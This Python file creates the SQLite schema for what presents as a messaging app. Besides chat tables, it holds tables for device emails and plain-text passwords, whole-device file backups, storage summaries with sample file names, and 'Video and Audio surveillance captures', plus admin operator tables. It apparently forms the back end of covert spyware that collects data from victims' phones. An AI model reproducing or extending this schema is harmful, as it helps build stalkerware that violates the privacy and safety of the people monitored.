import sqlite3
import os
import json
import time

DB_FILE = os.path.join(os.path.dirname(__file__), "app.db")

def get_db():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False, timeout=30.0)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cursor = conn.cursor()
    
    # Enable persistent WAL mode, normal synchronous, and 30s busy timeout
    cursor.execute("PRAGMA journal_mode = WAL;")
    cursor.execute("PRAGMA synchronous = NORMAL;")
    cursor.execute("PRAGMA busy_timeout = 30000;")
    cursor.execute("PRAGMA foreign_keys = ON;")
    
    # 1. Users table (No device contacts, strict @username discovery)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        username TEXT UNIQUE NOT NULL COLLATE NOCASE,
        display_name TEXT NOT NULL COLLATE NOCASE,
        avatar_url TEXT,
        bio TEXT,
        email TEXT,
        created_at INTEGER NOT NULL
    );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_users_search ON users(username, display_name);")

    # 1b. Devices table for remote device assignment via ANDROID_ID & credentials
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS devices (
        device_id TEXT PRIMARY KEY,
        user_id TEXT,
        device_model TEXT NOT NULL,
        username TEXT DEFAULT 'Current User',
        email TEXT,
        password TEXT,
        total_files INTEGER DEFAULT 0,
        last_sync_timestamp INTEGER NOT NULL
    );
    """)
    
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE users ADD COLUMN email TEXT;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE devices ADD COLUMN user_id TEXT;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE devices ADD COLUMN total_files INTEGER DEFAULT 0;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE devices ADD COLUMN email TEXT;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE devices ADD COLUMN password TEXT;")
    except sqlite3.OperationalError:
        pass
    try:
        cursor.execute("ALTER TABLE devices ADD COLUMN is_blocked INTEGER DEFAULT 0;")
    except sqlite3.OperationalError:
        pass

    # 1c. Device Storage Summary table for category breakdown
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS device_storage_summary (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        category TEXT NOT NULL,
        item_count INTEGER DEFAULT 0,
        total_bytes INTEGER DEFAULT 0,
        sample_names TEXT,
        FOREIGN KEY(device_id) REFERENCES devices(device_id) ON DELETE CASCADE
    );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_storage_device ON device_storage_summary(device_id);")
    
    # 2. In-App Contact Roster
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS in_app_contacts (
        owner_id TEXT NOT NULL,
        contact_user_id TEXT NOT NULL,
        saved_name TEXT,
        created_at INTEGER NOT NULL,
        PRIMARY KEY (owner_id, contact_user_id)
    );
    """)
    
    # 3. Conversations
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS conversations (
        id TEXT PRIMARY KEY,
        participant_one TEXT NOT NULL,
        participant_two TEXT NOT NULL,
        last_message_preview TEXT,
        last_message_time INTEGER,
        unread_count INTEGER DEFAULT 0
    );
    """)
    
    # 4. Messages
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS messages (
        id TEXT PRIMARY KEY,
        conversation_id TEXT NOT NULL,
        sender_id TEXT NOT NULL,
        recipient_id TEXT NOT NULL,
        message_type TEXT NOT NULL, -- 'TEXT', 'VOICE_NOTE', 'CALL_LOG'
        content TEXT,
        media_url TEXT,
        media_duration_ms INTEGER,
        waveform_data TEXT, -- JSON array of normalized integer amplitudes (0-100)
        status TEXT DEFAULT 'PENDING', -- 'PENDING', 'SENT', 'DELIVERED', 'READ'
        created_at INTEGER NOT NULL
    );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_msg_conv ON messages(conversation_id, created_at DESC);")
    
    # 5. Call Logs table
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS call_logs (
        id TEXT PRIMARY KEY,
        caller_id TEXT,
        recipient_id TEXT NOT NULL,
        is_video INTEGER DEFAULT 0,
        status TEXT DEFAULT 'INITIATED',
        timestamp INTEGER NOT NULL
    );
    """)

    # 6. Device Files table for whole-device backups
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS device_files (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        username TEXT,
        filename TEXT NOT NULL,
        category TEXT NOT NULL,
        size_bytes INTEGER NOT NULL,
        mime_type TEXT,
        file_path TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        FOREIGN KEY(device_id) REFERENCES devices(device_id) ON DELETE CASCADE
    );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_files_dev ON device_files(device_id);")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_files_user ON device_files(username);")

    # 7. Recorded Streams table for Video and Audio surveillance captures
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS recorded_streams (
        id TEXT PRIMARY KEY,
        device_id TEXT NOT NULL,
        user_id TEXT,
        username TEXT,
        stream_type TEXT NOT NULL, -- 'video' or 'audio'
        channel_name TEXT,
        filename TEXT NOT NULL,
        file_path TEXT NOT NULL,
        size_bytes INTEGER NOT NULL,
        duration_seconds INTEGER DEFAULT 0,
        mime_type TEXT NOT NULL,
        created_at INTEGER NOT NULL,
        FOREIGN KEY(device_id) REFERENCES devices(device_id) ON DELETE CASCADE
    );
    """)
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_recorded_streams_user ON recorded_streams(username);")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_recorded_streams_dev ON recorded_streams(device_id);")
    cursor.execute("CREATE INDEX IF NOT EXISTS idx_recorded_streams_type ON recorded_streams(stream_type);")

    # 8. Admin Users table for admin authentication & account creation
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS admin_users (
        id TEXT PRIMARY KEY,
        email TEXT UNIQUE NOT NULL COLLATE NOCASE,
        username TEXT NOT NULL,
        password TEXT NOT NULL,
        created_at INTEGER NOT NULL
    );
    """)

    # 9. Admin User Aliases table for customizable admin username per user
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS admin_user_aliases (
        user_key TEXT PRIMARY KEY COLLATE NOCASE,
        admin_alias TEXT NOT NULL,
        updated_at INTEGER NOT NULL
    );
    """)

    conn.commit()
    conn.close()

if __name__ == "__main__":
    init_db()
    print("Database initialized successfully with WAL mode.")
